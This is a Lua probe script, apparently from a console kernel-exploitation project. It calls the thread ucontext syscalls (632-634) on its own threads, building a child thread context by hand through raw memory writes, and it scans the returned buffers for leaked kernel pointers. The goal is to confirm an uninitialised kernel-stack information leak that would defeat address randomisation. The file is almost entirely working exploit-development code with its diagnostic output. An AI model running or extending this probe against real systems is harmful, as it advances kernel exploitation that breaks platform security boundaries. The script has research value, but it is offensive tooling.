-- CRASH_CLASS: MODERATE
-- PROBE 325a: sys 632-635 (thr_suspend/resume/get/set_ucontext) against threads we own
--
-- Context: sys_634.md says narg=2, slot0 = thread id, slot1 = output pointer:
-- it snapshots a 0x500 buffer, fills snapshot+0x40 through a helper, then
-- transfers 0x4c0 bytes from snapshot BASE to the user pointer. If anything in
-- that 0x4c0 window is not initialised, the copy hands a user buffer whatever
-- was on the kernel stack. The gate is caller byte +0x529 & 1, target flag
-- +0xe8 & 0x20, or target +0xe4 < 0. This probe measures the family on a
-- thread we created, and scans every copied qword for a kernel pointer.
--
-- Read-only for 632/633/634; 635 (set) is not called here.

print("=== PROBE 325a: THREAD UCONTEXT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function sgn(l)
    l = to_num(l)
    if l >= 0x80000000 then return l - 0x100000000 end
    return l
end
local function ptr(hi, lo)
    return uint64(string.format("0x%X%08X", hi, lo))
end
local function lo_of(v)
    local h, l = get_hi_lo(v)
    return to_num(l), to_num(h)
end

local sc_432 = make_syscall(432)   -- thr_self
local sc_thr = make_syscall(430)   -- thr_create
local sc_632 = make_syscall(632)   -- thr_suspend_ucontext
local sc_633 = make_syscall(633)   -- thr_resume_ucontext
local sc_634 = make_syscall(634)   -- thr_get_ucontext
local sc_info = make_syscall(593)
local sc_mmap = make_syscall(477)

local BUF = memory.alloc(0x600)
for i = 0, 0x600 - 8, 8 do safe_wq(BUF + i, uint64(0)) end

local function scan(tag)
    local hits, nz = 0, 0
    for i = 0, 0x4C0 - 8, 8 do
        local v = safe_rq(BUF + i)
        if v then
            local h, l = get_hi_lo(v)
            h, l = to_num(h), to_num(l)
            if h ~= 0 or l ~= 0 then
                nz = nz + 1
                if h >= 0xFFFF8000 then
                    hits = hits + 1
                    if hits <= 6 then
                        print(string.format("  %s KP @+0x%03X = 0x%08X%08X", tag, i, h, l))
                    end
                elseif nz <= 6 then
                    print(string.format("  %s  v @+0x%03X = 0x%08X%08X", tag, i, h, l))
                end
            end
        end
    end
    print(string.format("  %s nonzero=%d kernel_ptr=%d", tag, nz, hits))
    return hits
end

-- [A] the main thread's own id
local main_tid = -1
do
    local tbuf = memory.alloc(8)
    safe_wq(tbuf, uint64(0))
    local ok, rv = pcall(function() return sc_432(uint64(tbuf)) end)
    if ok then
        main_tid = safe_rd(tbuf) or -1
        print(string.format("[A] thr_self buf -> 0x%X (rv=%s)", main_tid,
            tostring(sgn(lo_of(rv)))))
    else
        print("[A] thr_self raised")
    end
end

-- [B] read the main thread's ucontext
do
    local ok, rv = pcall(function() return sc_634(uint64(main_tid), uint64(BUF)) end)
    print(string.format("[B] 634(main=0x%X) -> %s", main_tid,
        ok and tostring(sgn(lo_of(rv))) or "RAISED"))
    if ok and sgn(lo_of(rv)) == 0 then scan("B") end
end

-- [C] a child thread, then read its ucontext
local child = -1
do
    local info = memory.alloc(0x200)
    safe_wd(info, 0x160)
    pcall(function() sc_info(uint64(0), info) end)
    local lo = safe_rd(info + 0x108) or 0
    local hi = safe_rd(info + 0x10C) or 0
    local eboot = ptr(hi, lo)
    print(string.format("[C] eboot base = 0x%08X%08X", hi, lo))

    local spin = 0
    for off = 0, 0x20000 do
        local a = ptr(hi, lo + off)
        local v = safe_rd(a)
        if v and (v % 0x10000) == 0xFEEB then spin = lo + off break end
    end

    local ctx = memory.alloc(0x500)
    for i = 0, 0x500 - 8, 8 do safe_wq(ctx + i, uint64(0)) end
    safe_wq(ctx + 0x108, uint64(0x480))
    safe_wq(ctx + 0x0d0, uint64(0))
    safe_wq(ctx + 0x110, uint64(0x10000))
    safe_wq(ctx + 0x0c0, uint64(0x43))
    safe_wq(ctx + 0x0e0, ptr(hi, spin))
    local stack = sc_mmap(uint64(0), uint64(0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    local sl, sh = lo_of(stack)
    safe_wq(ctx + 0x0f8, ptr(sh, sl + 0x3000))
    safe_wq(ctx + 0x100, uint64(0x3b))

    local tid_out = memory.alloc(8)
    safe_wq(tid_out, uint64(0))
    local ok, rv = pcall(function() return sc_thr(uint64(ctx), uint64(tid_out), uint64(0)) end)
    child = safe_rd(tid_out) or -1
    print(string.format("[C] spin=0x%08X%08X thr_create -> %s tid=0x%X",
        hi, spin, ok and tostring(sgn(lo_of(rv))) or "RAISED", child))

    if child > 0 then
        local ok2, rv2 = pcall(function() return sc_634(uint64(child), uint64(BUF)) end)
        print(string.format("[C] 634(child=0x%X) -> %s", child,
            ok2 and tostring(sgn(lo_of(rv2))) or "RAISED"))
        if ok2 and sgn(lo_of(rv2)) == 0 then scan("C") end
    end
end

-- [D] suspend, read again, resume
if child > 0 then
    local ok, rv = pcall(function() return sc_632(uint64(child), uint64(BUF)) end)
    print(string.format("[D] 632 suspend -> %s", ok and tostring(sgn(lo_of(rv))) or "RAISED"))
    for i = 0, 0x600 - 8, 8 do safe_wq(BUF + i, uint64(0)) end
    local ok2, rv2 = pcall(function() return sc_634(uint64(child), uint64(BUF)) end)
    print(string.format("[D] 634 after suspend -> %s", ok2 and tostring(sgn(lo_of(rv2))) or "RAISED"))
    if ok2 and sgn(lo_of(rv2)) == 0 then scan("D") end
    local ok3, rv3 = pcall(function() return sc_633(uint64(child), uint64(BUF)) end)
    print(string.format("[D] 633 resume -> %s", ok3 and tostring(sgn(lo_of(rv3))) or "RAISED"))
end

print("")
print("=== 325a DONE ===")
